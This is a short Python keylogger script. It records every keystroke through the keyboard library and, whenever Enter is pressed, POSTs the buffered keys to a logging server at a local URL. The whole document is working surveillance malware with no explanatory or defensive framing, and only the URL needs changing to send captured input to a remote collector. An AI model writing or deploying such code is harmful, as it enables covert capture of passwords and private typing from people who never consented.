# Pressing the 'enter' key sends the keys to the server.
import keyboard
import requests

server_url = 'http://127.0.0.1:8888/log'
buffered_keys = []

while True:
    try:
        key_event = keyboard.read_event()
        key_name = key_event.name
        if key_name == 'enter':
            # When the enter key is entered, the contents of the buffer are transmitted and the buffer is emptied.
            if buffered_keys:
                keys = ''.join(buffered_keys)
                requests.post(server_url, data={'keys': keys})
                buffered_keys = []
        else:
            # Add non 'enter' to buffers
            buffered_keys.append(key_name)
    except KeyboardInterrupt:
        break
